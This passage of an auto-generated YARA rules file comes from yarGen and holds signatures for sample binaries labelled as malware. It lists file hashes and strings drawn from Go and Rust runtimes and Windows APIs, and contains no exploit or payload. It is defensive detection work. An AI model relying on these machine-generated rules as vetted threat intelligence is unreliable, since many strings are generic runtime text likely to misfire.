      $s1 = "network reset" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s2 = "network down" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s3 = "connection already in progress" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s4 = "owner dead" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s5 = "wrong protocol type" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s6 = "connection aborted" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 568 times */
      $s7 = "protocol not supported" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 568 times */
      $s8 = "network unreachable" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 569 times */
      $s9 = "host unreachable" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 571 times */
      $s10 = "protocol error" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.41'*/ /* Goodware String - occured 588 times */
      $s11 = "connection refused" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.40'*/ /* Goodware String - occured 597 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _6b3be5de40b3f2d063389b53e5fc63950ee2b9aad46d5ecc1e23c546746952b3_c879b4f8bd38ddc5797d625effb573e7478dbc57efb3c99593c2a5a98d_23 {
   meta:
      description = "mw - from files 6b3be5de40b3f2d063389b53e5fc63950ee2b9aad46d5ecc1e23c546746952b3, c879b4f8bd38ddc5797d625effb573e7478dbc57efb3c99593c2a5a98d12b641"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "6b3be5de40b3f2d063389b53e5fc63950ee2b9aad46d5ecc1e23c546746952b3"
      hash2 = "c879b4f8bd38ddc5797d625effb573e7478dbc57efb3c99593c2a5a98d12b641"
   strings:
      $s1 = "library\\std\\src\\sys_common\\thread_info.rs" fullword ascii /* score: '10.00'*/
      $s2 = " bytes failed" fullword ascii /* score: '9.00'*/
      $s3 = "0x000102030405060708091011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162" ascii /* score: '8.00'*/
      $s4 = "LayoutError" fullword ascii /* score: '7.00'*/
      $s5 = "NulError" fullword ascii /* score: '7.00'*/
      $s6 = "RUST_BACKTRACEfailed to write the buffered data" fullword ascii /* score: '7.00'*/
      $s7 = "UAWAVAUATVWS" fullword ascii /* score: '6.50'*/
      $s8 = "]library\\core\\src\\fmt\\num.rs" fullword ascii /* score: '4.00'*/
      $s9 = "r+ffffff." fullword ascii /* score: '4.00'*/
      $s10 = ".CRT$XLB" fullword ascii /* score: '4.00'*/
      $s11 = ".text$unlikely" fullword ascii /* score: '4.00'*/
      $s12 = "t$@ffffff." fullword ascii /* score: '4.00'*/
      $s13 = "punycode{-}0" fullword ascii /* score: '4.00'*/
      $s14 = "source slice length () does not match destination slice length (" fullword ascii /* score: '4.00'*/
      $s15 = "vffffff." fullword ascii /* score: '4.00'*/
      $s16 = "library\\alloc\\src\\sync.rs" fullword ascii /* score: '4.00'*/
      $s17 = "library\\core\\src\\unicode\\unicode_data.rs" fullword ascii /* score: '4.00'*/
      $s18 = "encode_utf8: need  bytes to encode U+, but the buffer has " fullword ascii /* score: '4.00'*/
      $s19 = "xfffff." fullword ascii /* score: '4.00'*/
      $s20 = "api-ms-win-core-synch-l1-2-0" fullword ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and ( 8 of them )
      ) or ( all of them )
}

rule _44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9_497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b9_24 {
   meta:
      description = "mw - from files 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9, 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      hash2 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
   strings:
      $s1 = "uireContextWEgyptian_HieroglyphsGetAcceptExSockaddrsGetAdaptersAddressesGetCurrentDirectoryWGetFileAttributesExWGetProcessMemory" ascii /* score: '20.00'*/
      $s2 = "meSao Tome Standard TimeTasmania Standard Timeaddress already in useadvapi32.dll not foundargument list too longassembly checks " ascii /* score: '18.00'*/
      $s3 = "roc1: new g is not Gdeadnewproc1: newg missing stackos: process already finishedprotocol driver not attachedregion exceeds uintp" ascii /* score: '18.00'*/
      $s4 = "tewakeup - double wakeupout of memory (stackalloc)persistentalloc: size == 0required key not availableruntime: bad span s.state=" ascii /* score: '18.00'*/
      $s5 = "ne Standard TimeGeorgian Standard TimeGetEnvironmentStringsWGetTimeZoneInformationHawaiian Standard TimeInscriptional_ParthianMo" ascii /* score: '15.00'*/
      $s6 = "1907348632812595367431640625CertCloseStoreCreateProcessWCryptGenRandomFindFirstFileWFormatMessageWGC assist waitGC worker initGe" ascii /* score: '15.00'*/
      $s7 = " to unallocated span37252902984619140625Arabic Standard TimeAzores Standard TimeCertOpenSystemStoreWCreateProcessAsUserWCryptAcq" ascii /* score: '14.00'*/
      $s8 = "ration not permittedoperation not supportedpanic during preemptoffprocresize: invalid argreflect.Value.Interfacereflect.Value.Nu" ascii /* score: '12.00'*/
      $s9 = "untain Standard TimeNyiakeng_Puachue_HmongPakistan Standard TimeParaguay Standard TimeRtlGetNtVersionNumbersSakhalin Standard Ti" ascii /* score: '12.00'*/
      $s10 = "compileCallback: float arguments not supportedmemory reservation exceeds address space limitpanicwrap: unexpected string after t" ascii /* score: '12.00'*/
      $s11 = " to non-Go memory , locked to thread298023223876953125Arab Standard TimeCaucasian_AlbanianCommandLineToArgvWCreateFileMappingWCu" ascii /* score: '11.00'*/
      $s12 = "FlushFileBuffersGC scavenge waitGC worker (idle)GODEBUG: value \"GetComputerNameWGetCurrentThreadGetFullPathNameWGetLongPathName" ascii /* score: '11.00'*/
      $s13 = "bytes.Buffer: too largechan receive (nil chan)close of closed channeldevice or resource busyfatal: morestack on g0" fullword ascii /* score: '10.00'*/
      $s14 = "enland Standard TimeGreenwich Standard TimeLogical_Order_ExceptionLord Howe Standard TimeMB during sweep; swept Marquesas Standa" ascii /* score: '10.00'*/
      $s15 = "mMethodreflect.methodValueCallruntime: internal errorruntime: invalid type  runtime: netpoll failedruntime: s.allocCount= s.allo" ascii /* score: '9.00'*/
      $s16 = "InfoIDS_Trinary_OperatorIsrael Standard TimeJordan Standard TimeMeroitic_HieroglyphsSeek: invalid offsetSeek: invalid whenceSetC" ascii /* score: '9.00'*/
      $s17 = "in unswept listpacer: sweep done at heap size pattern contains path separatorreflect: Len of non-array type resetspinning: not a" ascii /* score: '9.00'*/
      $s18 = " untyped locals , not a function0123456789ABCDEF0123456789abcdef2384185791015625CreateDirectoryWDnsNameCompare_WDuplicateTokenEx" ascii /* score: '9.00'*/
      $s19 = "nmentBlockE. Africa Standard TimeE. Europe Standard TimeFreeEnvironmentStringsWGetEnvironmentVariableWGetSystemTimeAsFileTimeGre" ascii /* score: '8.00'*/
      $s20 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625Central Brazilian Standard TimeMoun" ascii /* score: '7.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 15000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b_90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c34_25 {
   meta:
      description = "mw - from files 0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b, 90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b"
      hash2 = "90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
   strings:
      $s1 = "runtime.overrideWrite" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.modinfo.str" fullword ascii /* score: '13.00'*/
      $s3 = "runtime.profInsertLock" fullword ascii /* score: '10.00'*/
      $s4 = "runtime.printanycustomtype.jump4" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.write.abi0" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.asyncPreempt.abi0" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.allocmLock" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.moveTimers.jump12" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.(*_type).uncommon.jump5" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.mProfCycle" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.clearDeletedTimers.jump12" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.profBlockLock" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.goroutineProfile" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.unspillArgs.abi0" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.spillArgs.abi0" fullword ascii /* score: '10.00'*/
      $s16 = "runtime.modtimer.jump12" fullword ascii /* score: '10.00'*/
      $s17 = "runtime.typesEqual.jump33" fullword ascii /* score: '10.00'*/
      $s18 = "runtime.startingStackSize" fullword ascii /* score: '10.00'*/
      $s19 = "runtime.deltimer.jump7" fullword ascii /* score: '10.00'*/
      $s20 = "runtime.adjusttimers.jump17" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( 8 of them )
      ) or ( all of them )
}

rule _41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c_44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fc_26 {
   meta:
      description = "mw - from files 41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c, 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9, 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e, 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c"
      hash2 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      hash3 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      hash4 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
   strings:
      $s1 = "*aes.KeySizeError" fullword ascii /* score: '10.00'*/
      $s2 = "crypto/aes.KeySizeError.Error" fullword ascii /* score: '10.00'*/
      $s3 = "crypto/aes.(*KeySizeError).Error" fullword ascii /* score: '10.00'*/
      $s4 = "_expand_key_192a" fullword ascii /* score: '7.00'*/
      $s5 = "crypto/aes.expandKeyAsm" fullword ascii /* score: '7.00'*/
      $s6 = "_expand_key_128" fullword ascii /* score: '7.00'*/
      $s7 = "crypto/aes.expandKeyGo" fullword ascii /* score: '7.00'*/
      $s8 = "_expand_key_256b" fullword ascii /* score: '7.00'*/
      $s9 = "*base64.CorruptInputError" fullword ascii /* score: '7.00'*/
      $s10 = "_expand_key_256a" fullword ascii /* score: '7.00'*/
      $s11 = "_expand_key_192b" fullword ascii /* score: '7.00'*/
      $s12 = "crypto/aes.decryptBlockGo" fullword ascii /* score: '6.00'*/
      $s13 = "crypto/aes.decryptBlockAsm" fullword ascii /* score: '6.00'*/
      $s14 = "crypto/aes.(*aesCipherAsm).Decrypt" fullword ascii /* score: '6.00'*/
      $s15 = "crypto/aes.(*aesCipher).Decrypt" fullword ascii /* score: '6.00'*/
      $s16 = "crypto/aes.(*aesCipherGCM).Decrypt" fullword ascii /* score: '6.00'*/
      $s17 = "crypto/aes" fullword ascii /* score: '4.00'*/
      $s18 = "crypto/aes.subw" fullword ascii /* score: '4.00'*/
      $s19 = "crypto/aes.rotw" fullword ascii /* score: '4.00'*/
      $s20 = "encoding/base64.assemble32" fullword ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6_c879b4f8bd38ddc5797d625effb573e7478dbc57efb3c99593c2a5a98d_27 {
   meta:
      description = "mw - from files 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6, c879b4f8bd38ddc5797d625effb573e7478dbc57efb3c99593c2a5a98d12b641"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      hash2 = "c879b4f8bd38ddc5797d625effb573e7478dbc57efb3c99593c2a5a98d12b641"
   strings:
      $s1 = "DOWNGRD" fullword ascii /* score: '6.50'*/
      $s2 = "update" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.79'*/ /* Goodware String - occured 207 times */
      $s3 = "Request" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.76'*/ /* Goodware String - occured 236 times */
      $s4 = "signature" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.75'*/ /* Goodware String - occured 251 times */
      $s5 = "listen" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.70'*/ /* Goodware String - occured 304 times */
      $s6 = "server" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.60'*/ /* Goodware String - occured 401 times */
      $s7 = "master sH9" fullword ascii /* score: '4.00'*/
      $s8 = "key expaH9" fullword ascii /* score: '4.00'*/
      $s9 = "hashFunc" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s10 = "TLS 1.3, server CertificateVerify" fullword ascii /* score: '0.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( all of them )
      ) or ( all of them )
}

rule _3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c_6e705467c0c083d343ad4f9e2833cd229605257b034bd3c4ac3342b156_28 {
   meta:
      description = "mw - from files 3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c, 6e705467c0c083d343ad4f9e2833cd229605257b034bd3c4ac3342b156fb1594"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c"
      hash2 = "6e705467c0c083d343ad4f9e2833cd229605257b034bd3c4ac3342b156fb1594"
   strings:
      $s1 = "QeFbF~TiKwZ" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s2 = "8,4$6'9-$:.6*1#?pXhH~SeAlNrZbE" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s3 = "$8,4-6'96$:.?*1#HpXhA~SeZlNrSbE" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s4 = "lHt\\eF" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s5 = "QeTbF~ZiKw" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s6 = "4$8,9-6'.6$:#?*1hHpXeA~SrZlN" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s7 = "SbE\\lHtQeF" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s8 = "F~TbKwZi" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s9 = "Sbt\\lH" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s10 = ",4$8'9-6:.6$1#?*XhHpSeA~NrZlE" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s11 = "Q~TbFwZiK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s12 = "SHt\\lF" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c_44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fc_29 {
   meta:
      description = "mw - from files 41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c, 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9, 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e, 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6, 90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c"
      hash2 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      hash3 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      hash4 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      hash5 = "90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
      hash6 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = "runtime.stringtoslicebyte" fullword ascii /* score: '10.00'*/
      $s2 = "runtime.panicdottypeI" fullword ascii /* score: '10.00'*/
      $s3 = "runtime.rawbyteslice" fullword ascii /* score: '10.00'*/
      $s4 = "runtime.assertI2I2" fullword ascii /* score: '10.00'*/
      $s5 = "reflect.Kind.String" fullword ascii /* score: '7.00'*/
      $s6 = "reflect.resolveTypeOff" fullword ascii /* score: '7.00'*/
      $s7 = "encoding/binary.init" fullword ascii /* score: '7.00'*/
      $s8 = "reflect.(*rtype).uncommon" fullword ascii /* score: '7.00'*/
      $s9 = "unicode.init" fullword ascii /* score: '7.00'*/
      $s10 = "reflect.name.name" fullword ascii /* score: '7.00'*/
      $s11 = "strconv.formatBits" fullword ascii /* score: '7.00'*/
      $s12 = "reflect.(*ValueError).Error" fullword ascii /* score: '7.00'*/
      $s13 = "reflect.(*rtype).exportedMethods" fullword ascii /* score: '7.00'*/
      $s14 = "math.init" fullword ascii /* score: '7.00'*/
      $s15 = "reflect.Value.String" fullword ascii /* score: '7.00'*/
      $s16 = "strconv.FormatInt" fullword ascii /* score: '7.00'*/
      $s17 = "strconv.init" fullword ascii /* score: '7.00'*/
      $s18 = "reflect.resolveNameOff" fullword ascii /* score: '7.00'*/
      $s19 = "reflect.ChanDir.String" fullword ascii /* score: '7.00'*/
      $s20 = "reflect.init" fullword ascii /* score: '7.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b_41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4_30 {
   meta:
      description = "mw - from files 0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b, 41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b"
      hash2 = "41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c"
   strings:
      $s1 = "panic holding lockspanicwrap: no ( in panicwrap: no ) in runtime: g0 stack [runtime: pcdata is runtime: preempt g0semaRoot rotat" ascii /* score: '19.00'*/
      $s2 = "eLeftstopm holding lockssysMemStat overflowtoo many open filesunexpected g statusunknown wait reasonwinmm.dll not found markroot" ascii /* score: '19.00'*/
      $s3 = "che?ms: gomaxprocs=network is downno medium foundno such processpreempt SPWRITErecovery failedruntime error: runtime: frame runt" ascii /* score: '18.00'*/
      $s4 = "CertCloseStoreCreateProcessWCryptGenRandomFindFirstFileWFormatMessageWGC assist waitGC worker initGetConsoleModeGetProcAddressGe" ascii /* score: '16.00'*/
      $s5 = "kroot jobsmakechan: bad alignmentnanotime returning zerono space left on deviceoperation not permittedoperation not supportedpan" ascii /* score: '15.00'*/
      $s6 = "gcControllerState.findRunnable: blackening not enabledno goroutines (main called runtime.Goexit) - deadlock!runtime: signal rece" ascii /* score: '14.00'*/
      $s7 = "gcControllerState.findRunnable: blackening not enabledno goroutines (main called runtime.Goexit) - deadlock!runtime: signal rece" ascii /* score: '14.00'*/
      $s8 = "compileCallback: float arguments not supportedmemory reservation exceeds address space limitpanicwrap: unexpected string after t" ascii /* score: '12.00'*/
      $s9 = "roc1: new g is not Gdeadnewproc1: newg missing stackprotocol driver not attachedregion exceeds uintptr rangeruntime.semasleep un" ascii /* score: '10.00'*/
      $s10 = " send (nil chan)close of nil channelconnection timed outdodeltimer0: wrong Pfloating point errorforcegc: phase errorgo of nil fu" ascii /* score: '10.00'*/
      $s11 = "g= ms clock,  nBSSRoots= p->status= s.nelems=  schedtick= span.list= timerslen=, elemsize=, npages = : frame.sp=CloseHandleCreat" ascii /* score: '10.00'*/
      $s12 = " failedruntime: s.allocCount= s.allocCount > s.nelemsschedule: holding locksshrinkstack at bad timespan has no free stacksstack " ascii /* score: '10.00'*/
      $s13 = "no route to hostnon-Go function" fullword ascii /* score: '9.00'*/
      $s14 = "value=connectcpuproffloat32float64forcegcgctracehead = invalidminpc= pacer: panic: runningsyscalluintptrunknownwaiting bytes,  e" ascii /* score: '8.00'*/
      $s15 = "garbage collection scangcDrain phase incorrectindex out of range [%x]interrupted system callinvalid m->lockedInt = left over mar" ascii /* score: '8.00'*/
      $s16 = "pointer out of rangeruntime: panic before malloc heap initialized" fullword ascii /* score: '7.00'*/
      $s17 = "chan receive (nil chan)close of closed channeldevice or resource busyfatal: morestack on g0" fullword ascii /* score: '7.00'*/
      $s18 = "panic holding lockspanicwrap: no ( in panicwrap: no ) in runtime: g0 stack [runtime: pcdata is runtime: preempt g0semaRoot rotat" ascii /* score: '7.00'*/
      $s19 = "ived on thread not created by Go." fullword ascii /* score: '7.00'*/
      $s20 = "morebuf={pc:advertise errorasyncpreemptoffdouble scavengeforce gc (idle)key has expiredmalloc deadlockmisaligned maskmissing mca" ascii /* score: '6.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365_c879b4f8bd38ddc5797d625effb573e7478dbc57efb3c99593c2a5a98d_31 {
   meta:
      description = "mw - from files 33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365, c879b4f8bd38ddc5797d625effb573e7478dbc57efb3c99593c2a5a98d12b641"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365"
      hash2 = "c879b4f8bd38ddc5797d625effb573e7478dbc57efb3c99593c2a5a98d12b641"
   strings:
      $s1 = ".llvm.C:\\Users\\runneradmin\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\rustc-demangle-0.1.21\\src\\lib.rsN" fullword ascii /* score: '23.00'*/
      $s2 = "assertion failed: state_and_queue.addr() & STATE_MASK == RUNNINGOnce instance has previously been poisoned" fullword ascii /* score: '20.00'*/
      $s3 = "Local\\RustBacktraceMutex" fullword ascii /* score: '11.00'*/
      $s4 = "library\\std\\src\\sys\\windows\\stdio.rsUnexpected number of bytes for incomplete UTF-8 codepoint." fullword ascii /* score: '7.00'*/
      $s5 = "thread panicked while panicking. aborting." fullword ascii /* score: '7.00'*/
      $s6 = "     {" fullword ascii /* reversed goodware string '{     ' */ /* score: '6.00'*/
      $s7 = ": library\\std\\src\\io\\mod.rs" fullword ascii /* score: '4.00'*/
      $s8 = " right: ``: " fullword ascii /* score: '4.00'*/
      $s9 = "{recursion limit reached}{invalid syntax}" fullword ascii /* score: '4.00'*/
      $s10 = "library\\std\\src\\panicking.rsBox<dyn Any><unnamed>" fullword ascii /* score: '4.00'*/
      $s11 = "{size limit reached}SizeLimitExhausted" fullword ascii /* score: '4.00'*/
      $s12 = " is not a char boundary; it is inside  (bytes ) of `" fullword ascii /* score: '4.00'*/
      $s13 = "`fmt::Error` from `SizeLimitedFmtAdapter` was discarded" fullword ascii /* score: '3.00'*/
      $s14 = "capacity overflow" fullword ascii /* score: '2.00'*/
      $s15 = "$(E:$*L" fullword ascii /* score: '1.00'*/
      $s16 = "F L;G u%H" fullword ascii /* score: '1.00'*/
      $s17 = "([]_^A^A_H" fullword ascii /* score: '1.00'*/
      $s18 = "L$Ht H" fullword ascii /* score: '1.00'*/
      $s19 = "|$0ffff." fullword ascii /* score: '1.00'*/
      $s20 = "h[]_^A\\A]A^A_H" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and ( 8 of them )
      ) or ( all of them )
}

rule _497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e_790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fe_32 {
   meta:
      description = "mw - from files 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e, 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6, 90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      hash2 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      hash3 = "90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
      hash4 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = "internal/poll.execIO" fullword ascii /* score: '16.00'*/
      $s2 = "internal/poll.(*fdMutex).rwunlock" fullword ascii /* score: '15.00'*/
      $s3 = "internal/poll.(*fdMutex).rwlock" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.netpollblockcommit" fullword ascii /* score: '13.00'*/
      $s5 = "runtime.convT32" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.netpollblock" fullword ascii /* score: '10.00'*/
      $s7 = "internal/poll.(*FD).readConsole" fullword ascii /* score: '7.00'*/
      $s8 = "os.(*File).Read" fullword ascii /* score: '7.00'*/
      $s9 = "internal/poll.runtime_pollWait" fullword ascii /* score: '7.00'*/
      $s10 = "internal/poll.(*FD).readUnlock" fullword ascii /* score: '7.00'*/
      $s11 = "internal/poll.runtime_pollReset" fullword ascii /* score: '7.00'*/
      $s12 = "internal/poll.(*FD).Read.func1" fullword ascii /* score: '7.00'*/
      $s13 = "internal/poll.(*FD).Read" fullword ascii /* score: '7.00'*/
      $s14 = "syscall.Syscall6" fullword ascii /* score: '7.00'*/
      $s15 = "syscall.ReadConsole" fullword ascii /* score: '6.00'*/
      $s16 = "syscall.Read" fullword ascii /* score: '6.00'*/
      $s17 = "internal/poll.(*FD).writeUnlock" fullword ascii /* score: '4.00'*/
      $s18 = "internal/poll.(*FD).Write" fullword ascii /* score: '4.00'*/
      $s19 = "internal/poll.(*FD).Write.func1" fullword ascii /* score: '4.00'*/
      $s20 = "internal/poll.(*pollDesc).wait" fullword ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e_eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d_33 {
   meta:
      description = "mw - from files 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      hash2 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = "a.out.exe" fullword ascii /* score: '16.00'*/
